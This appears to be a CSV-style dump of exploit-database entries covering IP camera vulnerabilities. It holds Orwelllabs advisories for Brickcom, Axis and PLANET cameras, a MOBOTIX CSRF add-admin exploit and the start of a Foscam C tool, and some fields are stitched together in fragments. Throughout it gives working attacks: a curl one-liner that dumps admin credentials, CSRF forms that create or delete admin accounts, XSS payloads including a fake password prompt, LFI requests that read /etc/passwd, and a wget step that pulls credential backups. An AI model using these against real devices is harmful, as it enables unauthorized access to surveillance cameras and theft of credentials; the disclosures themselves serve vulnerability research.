xswitch_root
chroot
nfsroot
root@kali:~# john --show ipcamhashes
Mroot:cat1029:0:0::/root:/bin/sh
Wproot:cat1029:0:0::/root:/bin/sh
2 password hashes cracked, 0 left"
2016-04-14,WebApps,Hardware,Orwelllabs,Brickcom Corporation Network Cameras,Multiple Vulnerabilities,"www.orwelllabs.com
http://www.orwelllabs.com/2016/04/Brickcom-Multiple-Vulnerabilities.html
http://xxx.xxx.xxx.xxx/configfile.dump?action=get
http://xxx.xxx.xxx.xxx/configfile.dump.backup
http://xxx.xxx.xxx.xxx/configfile.dump.gz
http://xxx.xxx.xxx.xxx/configfile.dump
# To add an administrative credential: ""brickcom:brickcom""
# to remove this credential:","_ _ _       _
| | | |     | |
___  _ ____      _____| | | | __ _| |__  ___
/ _ \| '__\ \ /\ / / _ \ | | |/ _` | '_ \/ __|
| (_) | |   \ V  V /  __/ | | | (_| | |_) \__ \
\___/|_|    \_/\_/ \___|_|_|_|\__,_|_.__/|___/
Security Adivisory
2016-04-12
twt:@orwelllabs
sm1thw@0rw3lll4bs:~/bb# ./Bruce.S
[+] surveillance is the business model
of the internet - OK!
sm1thw@0rw3lll4bs:~/bb# echo $?
6079
Adivisory Information
Vendor: Brickcom Corporation
CVE-Number:N/A
Adivisory-URL:
OLSA-ID: OLSA-2015-12-12
Impact: High (especially because some of these products are used in
critical environments.)
Remote: Yes
p4n0pt1c0n
I.   Insecure Direct Object Reference/Authentication Bypass
II.  Sensitive information in plaintext
III. Hard-coded Credentials
IV.  Cross-site scripting
V.   Basic Authentication
VI.  Cross-site Request Forgery
Background
Brickcom (calls itself) as a ""leading network video manufacturer in the IP
surveillance industry.
Dedicated to providing the best IP surveillance solutions with a solid
foundation for engineering
quality network video equipment with a Research and Development Department
that has been producing
wireless broadband networking equipment for over twenty years.""
These products are used as video surveillance system by costumers and
important sectors such as the Thai 4ir F0rce, as can be seen on the
Vendor's web site.
* notes:
- some firmwares affected (item 'affected products' are very recent, having
been launched
a few months ago, and still vulnerable ... so this is an structural/legacy
problem.
- sensitive information presented in this advisory are fake.
I. Insecure Direct Object Reference/Authentication Bypass
(+) affected scripts
- configfile.dump
- syslog.dump
Path: Maintenance -> Configuration -> 'Export'
+ configfile.dump
An unauthenticated GET request to the script ""configfile.dump"", as follows:
or like this
or just
returns all camera settings
[..code_snip..]
DeviceBasicInfo.firmwareVersion=v3.0.6.12
DeviceBasicInfo.macAddress=00:00:00:00:00:00
DeviceBasicInfo.sensorID=OV9X11
DeviceBasicInfo.internalName=Brickcom
DeviceBasicInfo.productName=Di-1092AX
DeviceBasicInfo.displayName=CB-1092AX
DeviceBasicInfo.modelNumber=XXX
DeviceBasicInfo.companyName=Brickcom Corporation
DeviceBasicInfo.comments=[CUBE HD IPCam STREEDM]
DeviceBasicInfo.companyUrl=www.brickcom.com
DeviceBasicInfo.serialNumber=AXNB02B211111
DeviceBasicInfo.skuType=LIT
DeviceBasicInfo.ledIndicatorMode=1
DeviceBasicInfo.minorFW=1
DeviceBasicInfo.hardwareVersion=
DeviceBasicInfo.PseudoPDseProdNum=P3301
AudioDeviceSetting.muted=0
[..code_snip..]
and all credentials including the administrator account, like this:
UserSetSetting.userList.size=2
UserSetSetting.userList.users0.index=0
UserSetSetting.userList.users0.password=MyM4st3rP4ss   <<<--- admin pass
UserSetSetting.userList.users0.privilege=1
UserSetSetting.userList.users0.username=Cam_User       <<<--- admin user
UserSetSetting.userList.users1.index=0
UserSetSetting.userList.users1.password=C0mm0mP4ss     <<<--- (commom) user
pass
UserSetSetting.userList.users1.privilege=1
UserSetSetting.userList.users1.username=User_name      <<<--- (commom)
username
UserSetSetting.userList.users2.index=0
UserSetSetting.userList.users2.password=[..code_snip..]
[snip]
BasicNetworkSetting.pppoe.password=                   <<<--- ppoe user
BasicNetworkSetting.pppoe.username=                   <<<--- ppoe pass
UPnPSetting.enabled=1
UPnPSetting.name=CB-102Ap-1ffc3
Brickcom.enabled=1
DDNSSetting.dyndnsEnabled=0
DDNSSetting.dyndns.wildcardEnabled=0
DDNSSetting.dyndns.username=                         <<<--- dyndns user
DDNSSetting.dyndns.password=                         <<<--- dyndns password
DDNSSetting.dyndns.hostname=
DDNSSetting.tzodnsEnabled=0
DDNSSetting.tzodns.wildcardEnabled=0
DDNSSetting.tzodns.username=                         <<<--- and here...
DDNSSetting.tzodns.password=                         <<<--- here....
DDNSSetting.tzodns.hostname=
DDNSSetting.noipdnsEnabled=0
DDNSSetting.noipdns.wildcardEnabled=0
DDNSSetting.noipdns.username=                        <<<--- here
DDNSSetting.noipdns.password=                        <<<--- here
DDNSSetting.noipdns.hostname=
and many others...
- Path: System -> System Log -> 'Save to File'
+ syslog.dump
- Request:
(unauthenticated) GET http://xxx.xxx.xxx.xxx/syslog.dump?action=get
- Response:
[..code_snip..]
LOG_NOTICE-WebServer :User '[admin]' logged in to [web server], Sat Mar 1
21:13:36 2014
LOG_NOTICE-WebServer :User '[admin]' logged in to [web server], Sat Mar 1
21:11:02 2014
[..code_snip..]
Proof of Concept
Online Bash exploit-p0c:
curl -s -O http://xxx.xxx.xxx.xxx/configfile.dump && grep ""users0""
configfile.dump|awk '{ FS="".""; } { print $4; }' || echo -e ""[-] The target
seems not be vulnerable, Mr. Robot! \n""
IF target (xxx.xxx.xxx.xxx) is vulnerable the exploit will show a username,
password and privilege level (1:admin), like this:
password=4adm1niS3cr3tP4ss
privilege=1
username=BrickcomADMIN
and a configfile.dump with all credentials, settings, etc. will be recorded
locally.
IF not vulnerable, you'll see the message:
""[-] The target seems not bet vulnerable, Mr. Robot!""
II. sensitive information in plaintext
As shown, there are countless cases where credentials and other sensitive
information are store in plaintext.
III. Hard-coded Credentials
All credentials and other sensitive information can be found in html page
user_management_config.html,
Just viewing the html source code:
view-source:http://{xxx.xxx.xxx.xxx}/user_management_config.html
<script type=""text/javascript"">
var Edit_id="""";
var userSet_size=""5""
var User_index=new Array(10);
var User_username=new Array(10);
var User_password=new Array(10);
var User_privilege=new Array(10);
User_index[0]=""1"";
User_username[0]=""admin""; <<<----
User_password[0]=""admin""; <<<----
User_privilege[0]=""1"";
User_index[1]=""2"";
User_username[1]=""masteruser""; <<<----
User_password[1]=""masterP4sss1*""; <<<----
User_privilege[1]=""0"";
IV. Cross-site scripting
(+) Script: /cgi-bin/NotificationTest.cgi
(+) Param: action=
REQUEST: http://xxx.xxx.xxx.xxx/cgi-bin/NotificationTest.cgi?action=[ **
XSS
**]&addressType=&hostname=h0stn4mE&ipAddress=xxx.xxx.xxxx.xxx&ipv6Address=&portNo=&accountName=brickcom&password=brickcom&ShareDIR=
V. Basic Authentication
The response asks the user to enter credentials for Basic HTTP
authentication.
If these are supplied, they will be submitted over clear-text HTTP (in
Base64-encoded form).
V. Cross-site Request Forgery
> Privilege levels:
- visor : 0
- admin : 1
- visor remoto : 2
<html>
<!-- Brickcom FB-100Ae IP Box Camera- CSRF PoC -->
<body>
<form action=""http://{xxx.xxx.xxx.xxx}/cgi-bin/users.cgi"" method=""POST"">
<input type=""hidden"" name=""action"" value=""add"" />
<input type=""hidden"" name=""index"" value=""0"" />
<input type=""hidden"" name=""username"" value=""brickcom"" />
<input type=""hidden"" name=""password"" value=""brickcom"" />
<input type=""hidden"" name=""privilege"" value=""1"" />
<input type=""submit"" value=""Submit form"" />
</form>
</body>
</html>
<html>
<!-- Brickcom FB-100Ae IP Box Camera- CSRF PoC -->
<body>
<form action=""http://{xxx.xxx.xxx.xxx}/cgi-bin/users.cgi"" method=""POST"">
<input type=""hidden"" name=""action"" value=""delete"" />
<input type=""hidden"" name=""username"" value=""brickcom"" />
<input type=""submit"" value=""Submit form"" />
</form>
</body>
</html>
affected products
(+) various products, including models:
Brickcom FB-100Ae IP Box Camera - Firmware Version: v3.0.6.12
(release:09/08/2010 14:46)
Brickcom WCB-100Ap Wireless Camera - Firmware Version: v3.0.6.26
(release:01/21/2011 18:31)
Vandal Dome Cameras
Brickcom VD-202Ne Vandal Dome Camera - Firmware Version: v37019_Promise
(release:2015-10-01_18:46:07)
Brickcom VD-300Np Vandal Dome Camera - Firmware Version: v3.7.0.23T
(release:2016-03-21_10:08:24)
Brickcom VD-E200Nf Vandal Dome Camera - Firmware Version: v3.7.0.5T
(release:2015-06-25_11:18:07)
Bullet Cameras
Brickcom OB-202Ne Bullet Camera - Firmware Version: v3.7.0.18R
(release:2015-09-08_18:40:11)
Brickcom OB-E200Nf Bullet Camera - Firmware Version: v3.7.0.18.3R
(release:2015-10-16_11:36:46)
Brickcom OB-200Np-LR Bullet Camera - Firmware Version: v3.7.0.18.3R
(release:2015-10-15_11:30:46)
Brickcom OB-500Ap Bullet Camera - Firmware Version: v3.7.0.1cR
(release:2016-01-18_10:07:03)
Brickcom GOB-300Np Bullet Camera (Unique Series) - Firmware Version:
v3.7.0.17A (release: 2015-07-10_11:36:41)
Brickcom OB-200Np-LR Bullet Camera (Unique Series) - Firmware Version:
v3.7.0.18.3R (release: 2015-10-15_11:30:46)
Mini Dome Camera
Brickcom MD-300Np Mini Dome Camera - Firmware Version: v3.2.2.8
(release:2013-08-01)
Cube Camera
Brickcom CB-102Ae V2 Cube Camera - Firmware Version: v3.0.6.12 (release:
09/07/2010 11:45)
Fixed Dome Camera
Brickcom FD-202Ne Fixed Dome Camera - Firmware Version:v3.7.0.17R
(release: 2015-08-19_18:47:31)
Legal Notices
The information contained within this advisory is supplied ""as-is"" with no
warranties or guarantees of fitness of use or otherwise.
I accept no responsibility for any damage caused by the use or misuse of
this information.
Timeline
2015-03-20  - Issues discovered
2015-03-30  - attempt to contact Vendor
2015-12-12  - attempt to assign CVE
2016-04-12  - Not easy way to contact vendor, (ON Twitter) the last tweet
was 2011-01-31...
2016-04-14  - Full disclosure
About Orwelllabs
Orwelllabs is a (doubleplusungood) security research lab interested in
embedded device & webapp hacking &&
aims to create some intelligence around this vast and confusing picture
that is the Internet of things.
-----BEGIN PGP PUBLIC KEY BLOCK-----
mQENBFcJl8wBCAC/J8rAQdOoC82gik6LVbH674HnxAAQ6rBdELkyR2S2g1zMIAFt
xNN//A3bUWwFtlrfgiJkiOC86FimPus5O/c4iZc8klm07hxWuzoLPzBPM50+uGKH
xZwwLa5PLuuR1T0O+OFqd9sdltz6djaYrFsdq6DZHVrp31P7LqHHRVwN8vzqWmSf
55hDGNTrjbnmfuAgQDrjA6FA2i6AWSTXEuDd5NjCN8jCorCczDeLXTY5HuJDb2GY
U9H5kjbgX/n3/UvQpUOEQ5JgW1QoqidP8ZwsMcK5pCtr9Ocm+MWEN2tuRcQq3y5I
SRuBk/FPhVVnx5ZrLveClCgefYdqqHi9owUTABEBAAG0IU9yd2VsbExhYnMgPG9y
d2VsbGxhYnNAZ21haWwuY29tPokBOQQTAQgAIwUCVwmXzAIbAwcLCQgHAwIBBhUI
AgkKCwQWAgMBAh4BAheAAAoJELs081R5pszAhGoIALxa6tCCUoQeksHfR5ixEHhA
Zrx+i3ZopI2ZqQyxKwbnqXP87lagjSaZUk4/NkB/rWMe5ed4bHLROf0PAOYAQstE
f5Nx2tjK7uKOw+SrnnFP08MGBQqJDu8rFmfjBsX2nIo2BgowfFC5XfDl+41cMy9n
pVVK9qHDp9aBSd3gMc90nalSQTI/QwZ6ywvg+5/mG2iidSsePlfg5d+BzQoc6SpW
LUTJY0RBS0Gsg88XihT58wnX3KhucxVx9RnhainuhH23tPdfPkuEDQqEM/hTVlmN
95rV1waD4+86IWG3Zvx79kbBnctD/e9KGvaeB47mvNPJ3L3r1/tT3AQE+Vv1q965
AQ0EVwmXzAEIAKgsUvquy3q8gZ6/t6J+VR7ed8QxZ7z7LauHvqajpipFV83PnVWf
ulaAIazUyy1XWn80bVnQ227fOJj5VqscfnHqBvXnYNjGLCNMRix5kjD/gJ/0pm0U
gqcrowSUFSJNTGk5b7Axdpz4ZyZFzXc33R4Wvkg/SAvLleU40S2wayCX+QpwxlMm
tnBExzgetRyNN5XENATfr87CSuAaS/CGfpV5reSoX1uOkALaQjjM2ADkuUWDp6KK
6L90h8vFLUCs+++ITWU9TA1FZxqTl6n/OnyC0ufUmvI4hIuQV3nxwFnBj1Q/sxHc
TbVSFcGqz2U8W9ka3sFuTQrkPIycfoOAbg0AEQEAAYkBHwQYAQgACQUCVwmXzAIb
DAAKCRC7NPNUeabMwLE8B/91F99flUVEpHdvy632H6lt2WTrtPl4ELUy04jsKC30
MDnsfEjXDYMk1GCqmXwJnztwEnTP17YO8N7/EY4xTgpQxUwjlpah++51JfXO58Sf
Os5lBcar8e82m1u7NaCN2EKGNEaNC1EbgUw78ylHU3B0Bb/frKQCEd60/Bkv0h4q
FoPujMQr0anKWJCz5NILOShdeOWXIjBWxikhXFOUgsUBYgJjCh2b9SqwQ2UXjFsU
I0gn7SsgP0uDV7spWv/ef90JYPpAQ4/tEK6ew8yYTJ/omudsGLt4vl565ArKcGwB
C0O2PBppCrHnjzck1xxVdHZFyIgWiiAmRyV83CiOfg37
=IZYl
-----END PGP PUBLIC KEY BLOCK-----"
2016-04-11,WebApps,Hardware,Orwelllabs,Axis Network Cameras,Multiple Vulnerabilities,"www.orwelllabs.com
http://www.orwelllabs.com/2016/01/axis-network-cameras-multiple-cross.html
# 1 Attacker injects a javascript payload in the vulnerable page:
http://{axishost}/axis-cgi/vaconfig.cgi?action=get&name=<script
http://{axishost}/axis-cgi/admin/systemlog.cgi?id
http://{axishost}/axis-cgi/vaconfig.cgi?action=get&name=<script src=""http://
http://
# Other Vectors
http://
http://{axishost}/view/custom_whiteBalance.shtml?imagePath=<img src=""xs""
http://
http://
http://
# SCRIPTPATHS:","_ _ _       _
| | | |     | |
___  _ ____      _____| | | | __ _| |__  ___
/ _ \| '__\ \ /\ / / _ \ | | |/ _` | '_ \/ __|   6079 Smith W
| (_) | |   \ V  V /  __/ | | | (_| | |_) \__ \   doubleplusungood
\___/|_|    \_/\_/ \___|_|_|_|\__,_|_.__/|___/   owning some telescreens...
Security Adivisory
2016-04-09
twt:@orwelllabs
I. ADVISORY INFORMATION
Title: Axis Network Cameras Multiple Cross-site scripting
Vendor: Axis Communications
Class: Improper Input Validation [CWE-20]
CVE Name: CVE-2015-8256
Remotely Exploitable: Yes
Locally Exploitable: No
OLSA-ID: OLSA-2015-8256
Adivisory URL:
II. Background
Axis is the market leader in network video, invented the world’s first
network camera back in 1996 and we’ve been innovators in video surveillance
ever since. Axis network video products are installed in public places and
areas such as retail chains, airports, trains, motorways, universities,
prisons, casinos and banks.
III. vulnerability
AXIS Network Cameras are prone to multiple (stored/reflected) cross-site
scripting vulnerability.
IV. technical details
These attack vectors allow you to execute an arbitrary javascript code in
the user browser (session) with this steps:
type=""text/javascript>prompt(""AXIS_PASSWORD:"")</script>
This will create a entry in the genneral log file (/var/log/messages) So,
when the user is viewing the log 'system options' -> 'support' -> 'Logs &
Reports':
will be displayed a prompt for the password of the current user
('AXIS_PASSWORD').
However, due to CSRF presented is even possible to perform all actions
already presented: create, edit and remove users and applications, etc. For
example, to delete an application ""axis_update"" via SXSS:
axishost/axis-cgi/admin/local_del.cgi?+/usr/html/local/viewer/axis_update.shtml""></script>
* A reflected cross-site scripting affects all models of AXIS devices on
the same parameter:
{axis-cam-model}/view/view.shtml?imagePath=0WLL</script><script>alert('AXIS-XSS')</script><!--
{axishost}/admin/config.shtml?group=%3Cscript%3Ealert%281%29%3C/script%3E
onerror=alert(7) /><!--
{axishost}/admin-bin/editcgi.cgi?file=<script>alert('SmithW')</script>
{axishost}/operator/recipient_test.shtml?protocol=%3Cscript%3Ealert%281%29%3C/script%3E
{axishost}/admin/showReport.shtml?content=alwaysmulti.sdp&pageTitle=axis</title></head><body><pre><script>alert(1)</script>
{HTMLROOT}/showReport.shtml
{HTMLROOT}/config.shtml
{HTMLROOT}/incl/top_incl.shtml
{HTMLROOT}/incl/popup_header.shtml
{HTMLROOT}/incl/page_header.shtml
{HTMLROOT}/incl/top_incl_popup.shtml
{HTMLROOT}/viewAreas.shtml
{HTMLROOT}/vmd.shtml
{HTMLROOT}/custom_whiteBalance.shtml
{HTMLROOT}/playWindow.shtml
{HTMLROOT}/incl/ptz_incl.shtml
{HTMLROOT}/view.shtml
{HTMLROOT}/streampreview.shtml
And many, many others...
V. Impact
allows to run arbitrary code on a victim's browser and computer if combined
with another flaws in the same devices.
VI. Affected products
Multiple Axis Network products.
VII. solution
It was not provided any solution to the problem.
VIII. Credits
The vulnerability has been discovered by SmithW from OrwellLabs
IX. Legal Notices
The information contained within this advisory is supplied ""as-is"" with no
warranties or guarantees of fitness of use or otherwise. I accept no
responsibility for any damage caused by the use or misuse of this
information.
X. Vendor solutions and workarounds
There was no response from the vendor.
About Orwelllabs
Orwelllabs is a (doubleplusungood) security research lab interested in embedded
device & webapp hacking."
2016-04-07,WebApps,Hardware,Orwelllabs,PLANET Technology IP Surveillance Cameras,Multiple Vulnerabilities,"http://www.orwelllabs.com/2016/02/planet-ip-surveillance-camera-local.html
http://
http://{xxx.xxx.xxx.xxx}/setup.cgi?<script>alert(""XSS"")</script>
https://{xxx.xxx.xxx.xxx}/default_nets.htm
//alert(""watchdog"");","_ _ _       _
| | | |     | |
___  _ ____      _____| | | | __ _| |__  ___
/ _ \| '__\ \ /\ / / _ \ | | |/ _` | '_ \/ __|
| (_) | |   \ V  V /  __/ | | | (_| | |_) \__ \
\___/|_|    \_/\_/ \___|_|_|_|\__,_|_.__/|___/
Security Adivisory
2016-04-06                 www.orwelllabs.com
Twitter:@orwelllabs
mantra: ...not affect a product that is in scope for... AhHum!
Overview
Technical Risk: high
Likelihood of Exploitation: medium
Credits: Discovered and researched by Orwelllabs
CVE-Number: N/A
DWF: Submited
Adivisory URL:
[1]
Issues
I.   Local File Inclusion (42 vectors)
II.  Arbitrary file read/Authentication bypass
III. Sensitive information disclosure
IV.  Cross-site request forgery
V.   Reflected Cross-site scripting
VI.  hardcoded credentials
I. Local File Inclusion
* CLASS: External Control of File Name or Path [CWE-73]
The Web Management interface of PLANET IP surveillance Cams models
FW-ICA-2500,
ICA-2250VT, ICA-4200V, ICA-4500V, ICA-3350V, ICA-5350V AND ICA-8350 and
probably
others is prone to Local File Include (LFI).
PoC
The request bellow is generated when a new user is added, in this case
we are adding the following administrative credential for the cam:
""root:r00tx"".
GET /cgi-bin/admin/querylogin.cgi HTTP/1.1
Host: {xxx.xxx.xxx.xxx}
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101
Firefox/42.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://
{xxx.xxx.xxx.xxx}/cgi-bin/admin/usrgrp.cgi?user=root&pwd=r00tx&grp=administrator&sgrp=ptz&action=add&redirect=asp%2Fuser.asp
Cookie: ipcam_profile=1; tour_index=-1; IsHideStreamingStatus=yes
Authorization: Basic YdRRtXW41YXRtad4=
Connection: keep-alive
If-Modified-Since: Mon, 08 Jul 2013 11:10:26 GMT
If the value of the parameter ""redirect"" was changed to any system file
will return the contents of that file, as shown below:
{xxx.xxx.xxx.xxx}/cgi-bin/admin/usrgrp.cgi?user=root&pwd=r00tx&grp=administrator&sgrp=ptz&action=add&redirect=/etc/passwd
In this case will retrieved the content of /etc/passwd
Vectors:
There are a total of 42 vectors of LFI, the detailed results will be
published in www.orwelllabs.com [1] soon.
Basically all menus of the camera (shown below) to submit, add, modify and
remove settings trigger the corresponding
scripts to access resource that contains a parameter ""redirect"" which is
also affected.
[ ----------------------------]
[ #1:  Network ---------------] -> 9
[ #2:  Camera  ---------------] -> 3
[ #3:  System  -------------- ] -> 2
[ #4:  Video   -------------- ] -> 4
[ #5:  Audio   -------------- ] -> 1
[ #6:  User    -------------- ] -> 1
[ #7:  Protocol ------------- ] -> 2
[ #8:  E-Mail  -------------- ] -> 1
[ #9:  Event Detection ------ ] -> 1
[ #10: Storage -------------- ] -> 2
[ #11: Continuous Recording - ] -> 1
[ #12: Recording List ------- ] -> 0
[ #13: Event Server --------- ] -> 11
[ #14: Event Schedule ------- ] -> 4
[ ----------+---------------  ]
II. Arbitrary file read/Authentication bypass
The camera offers a feature to perform the download settings via a backup
file. However,
(how acess control is not effective) this file remains accessible via the
browser for an unauthenticated user.
PoC
wget --no-check-certificate https://{xxx.xxx.xxx.xxx}/backup.tar.gz
tar -xzvf backup.tar.gz
cat tmp/sysConfig/sysenv.cfg|strings|fmt|cut -f8,9 -d"" ""
It will return the credential to access the camera
Through this vulnerability a user can also obtain the credential of the AP
to which the camera is connected just parsing
the file: 'tmp/sysConfig/extra.info'
III. Sensitive information disclosure
Using LFI vulnerability report, a user can obtain sensitive information
such as username and password by reading the log file, as follows:
{xxx.xxx.xxx.xxx}/cgi-bin/admin/usrgrp.cgi?user=&pwd=&grp=&sgrp=&action=&redirect=/var/log/messages
IV. Cross-site request forgery
Planet IP cams ICA-* are prone to Multple CSRF.
PoC
- This will create a admin credential: root:r00tx
<html>
<!-- CSRF PoC - -->
<body>
<form action=""http://
{xxx.xxx.xxx.xxx}/setup.cgi?language=ie&adduser=root:r00tx:1"">
<input type=""submit"" value=""Submit form"" />
</form>
</body>
</html>
- ICA-5350V
<html>
<!-- CSRF PoC -->
<body>
<form action=""http://
{xxx.xxx.xxx.xxx}/cgi-bin/admin/usrgrp.cgi?user=root&pwd=r00tx&grp=administrator&sgrp=ptz&action=add&redirect=asp%2Fuser.asp"">
<input type=""submit"" value=""Submit form"" />
</form>
</body>
</html>
- Del user root
<html>
<!-- CSRF PoC -->
<body>
<form action=""http://
{xxx.xxx.xxx.xxx}/cgi-bin/admin/usrgrp.cgi?user=root&pwd=r00tx&grp=administrator&sgrp=ptz&action=remove&redirect=asp%2Fuser.asp"">
<input type=""submit"" value=""Submit form"" />
</form>
</body>
</html>
V. Cross-Site Scripting
Cams models ICA-* are prone to Multiple XSS
POC
this will pop-up the message XSS in the browser
VI. hardcoded credentials
The credentials of web management can be found just viewing the source of
page default_nets.htm:
POC
code:
function av_onload(){
CheckMobileMode();
util_SetUserInfo();
Loadplay();
watchdog();
function Loadplay(){
play(""MasterUsr"",""MasterPwd"",""554"",parseInt(""99""),parseInt(""99""),""1"",parseInt(""2""),parseInt(""0""),""192.168.1.99"","""");
Vulnerable Packages
ICA-2500
ICA-2250VT
ICA-4200V
ICA-4500V
ICA-3350V
ICA-5350V
ICA-8350
Timeline
2015-10-02 - Issues discovered
2015-11-30 - Vendor contacted (advisore sent)
2015-12-16 - Vendor contacted (asking for feedback about reported issues)
2015-12-17 - Vendor response (asking for more time to check issues)
2015-12-21 - RD team replied: can't duplicate vulnerabilities....
2016-01-13 - Vendor contacted (submitted evidence that the vulnerabilities
persist and can be reproduced.)
...and no news after that..."
2016-03-31,WebApps,Hardware,LiquidWorm,MOBOTIX Video Security Cameras,Cross-Site Request Forgery (Add Admin),"Summary: MOBOTIX is a German System Manufacturer of Professional Video
Desc: The application interface allows users to perform certain actions via","MOBOTIX Video Security Cameras CSRF Add Admin Exploit
Vendor: MOBOTIX AG
Product web page: https://www.mobotix.com
Affected version: [Model]: D22M-Secure, [HW]: T2r1.1.AA, 520 MHz, 128 MByte RAM, [SW]: MX-V3.5.2.23.r3
[Model]: Q24M-Secure, [HW]: T2r3.1, 806 MHz, [SW]: MX-V4.1.10.28
[Model]: D14D-Secure, [HW]: T2r4.2b, 806 MHz, 256 MByte RAM, [SW]: MX-V4.1.4.70
[Model]: M15D-Secure, [HW]: T3r4.4, 806 MHz, [SW]: MX-V4.3.4.50
Management (VMS) and Smart IP Cameras. These cameras support all standard
features of MOBOTIX IP cameras like automatic object detection, messaging
via network and onboard or network recording. The dual lens thermal system
supports additionally a second optical video sensor with 6-megapixel resolution.
HTTP requests without performing any validity checks to verify the requests.
This can be exploited to perform certain actions with administrative privileges
if a logged-in user visits a malicious web site.
Tested on: Linux 2.6.37.6+
thttpd/2.19-MX
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2016-5312
Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5312.php
25.02.2016
Add admin user Testingus:
<html>
<body>
<form action=""http://10.0.0.17/admin/access"" method=""POST"">
<input type=""hidden"" name=""user&#95;name&#95;0"" value=""admin"" />
<input type=""hidden"" name=""user&#95;group&#95;0"" value=""admins"" />
<input type=""hidden"" name=""user&#95;passwd&#95;a&#95;0"" value=""&#42;&#42;&#42;"" />
<input type=""hidden"" name=""user&#95;passwd&#95;b&#95;0"" value=""&#42;&#42;&#42;"" />
<input type=""hidden"" name=""user&#95;name&#95;2"" value=""Testingus"" />
<input type=""hidden"" name=""user&#95;group&#95;1"" value=""admins"" />
<input type=""hidden"" name=""user&#95;passwd&#95;a&#95;2"" value=""l33tp4ss"" />
<input type=""hidden"" name=""user&#95;passwd&#95;b&#95;2"" value=""l33tp4ss"" />
<input type=""hidden"" name=""sv&#95;passwd&#95;a"" value="""" />
<input type=""hidden"" name=""sv&#95;passwd&#95;b"" value="""" />
<input type=""hidden"" name=""super&#95;pin&#95;1"" value="""" />
<input type=""hidden"" name=""super&#95;pin&#95;2"" value="""" />
<input type=""hidden"" name=""save&#95;config"" value=""Set"" />
<input type=""submit"" value=""Submit"" />
</form>
</body>
</html>
Add group 'users' to admin area:
<html>
<body>
<form action=""http://10.0.0.17/admin/acl"" method=""POST"">
<input type=""hidden"" name=""group&#95;allow&#95;guest&#95;global"" value=""on"" />
<input type=""hidden"" name=""group&#95;allow&#95;live&#95;global"" value=""on"" />
<input type=""hidden"" name=""group&#95;allow&#95;player&#95;global"" value=""on"" />
<input type=""hidden"" name=""group&#95;allow&#95;multiview&#95;global"" value=""on"" />
<input type=""hidden"" name=""group&#95;allow&#95;pda&#95;global"" value=""on"" />
<input type=""hidden"" name=""group&#95;allow&#95;mxcc&#95;global"" value=""on"" />
<input type=""hidden"" name=""group&#95;allow&#95;info&#95;global"" value=""on"" />
<input type=""hidden"" name=""group&#95;allow&#95;imagelink&#95;global"" value=""on"" />
<input type=""hidden"" name=""group&#95;allow&#95;api&#95;global"" value=""on"" />
<input type=""hidden"" name=""group&#95;allow&#95;image&#95;setup&#95;0"" value=""on"" />
<input type=""hidden"" name=""group&#95;allow&#95;event&#95;setup&#95;0"" value=""on"" />
<input type=""hidden"" name=""group&#95;name&#95;1"" value=""guests"" />
<input type=""hidden"" name=""group&#95;name&#95;2"" value=""users"" />
<input type=""hidden"" name=""group&#95;allow&#95;admin&#95;2"" value=""on"" />
<input type=""hidden"" name=""group&#95;allow&#95;image&#95;setup&#95;2"" value=""on"" />
<input type=""hidden"" name=""group&#95;allow&#95;event&#95;setup&#95;2"" value=""on"" />
<input type=""hidden"" name=""new&#95;group"" value="""" />
<input type=""hidden"" name=""save&#95;config"" value=""Set"" />
<input type=""hidden"" name=""more&#95;or&#95;less"" value=""less"" />
<input type=""submit"" value=""Submit"" />
</form>
</body>
</html>"
2014-05-08,Remote,Hardware,Sergey Shekyan,Foscam IP Camera,Predictable Credentials Security Bypass,"// source: https://www.securityfocus.com/bid/67510/info
#include <string.h>
#include <getopt.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/errno.h>
#include <arpa/inet.h>
#include <netdb.h>
#include ""camtool.h""
#define IP_BUF_LEN 16
#define RESP_BUF_LEN 1024
#define PORT_BUF_LEN 6
#define UNAME_LEN 6
#define DELIM 0x1
#define REQ_POS_PID 1
#define REQ_POS_UNAME 2
#define REQ_POS_PWD 3
#define REQ_POS_OEM 4
#define REQ_POS_DOMAIN_COUNT 5
#define REQ_POS_DOMAIN_0 6
#define RES_POS_PID 1
#define RES_POS_ERROR 2
#define RES_POS_MSG 3
#define RES_POS_DOMAIN_COUNT 4
#define RES_POS_DOMAIN_0 5
#define RES_ENT_SRV_COUNT 6
#define RES_ENT_SRV_0 7
#define RES_ENT_SRV_MPORT_0 8
#define RES_ENT_SRV_APORT_0 9
#define KEY_PID ""PID""
#define KEY_UNAME ""UName""
#define KEY_PWD ""PWD""
#define KEY_OEM ""OEM""
#define KEY_DOMAIN_COUNT ""DomainCount""
#define KEY_DOMAIN_0 ""Domain0""
#define KEY_ENT_SRV_0 ""EntServer0""
#define KEY_ENT_SRV_MPORT_0 ""EntServerMPort0""
// Make sure that hostname is exactly UNAME_LEN
// Insert hostname to payload
// Insert pwd to payload
// Insert domain to payload
/* Create socket and get the data from DDNS server */
/* Send the request */
/* Insert hostname into payload */
/* Send payload to DDNS */
/* Get the response */
/* Make sure it's a redirect */
/* Extract the server name */
/* Extract port */
/* Update redirect payload and send to DDNS */","Foscam IP Camera is prone to a security-bypass vulnerability.
An attacker can exploit this issue to gain access to sensitive information and perform certain unauthorized actions; this may lead to further attacks.
Foscam IP Camera 11.37.2.49 and prior versions are vulnerable.
* Copyright 2013 Artem Harutyunyan, Sergey Shekyan
* Licensed under the Apache License, Version 2.0 (the ""License"");
* you may not use this file except in compliance with the License.
* You may obtain a copy of the License at
* http://www.apache.org/licenses/LICENSE-2.0
* Unless required by applicable law or agreed to in writing, software
* distributed under the License is distributed on an ""AS IS"" BASIS,
* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
* See the License for the specific language governing permissions and
* limitations under the License.
static char initial_payload[] = {
0x01, 0x50, 0x49, 0x44, 0x3d, 0x31, 0x34, 0x01, 0x55, 0x4e, 0x61, 0x6d,
0x65, 0x3d, 0x63, 0x68, 0x31, 0x32, 0x36, 0x36, 0x01, 0x50, 0x57, 0x44,
0x3d, 0x63, 0x68, 0x31, 0x32, 0x36, 0x36, 0x01, 0x4f, 0x45, 0x4d, 0x3d,
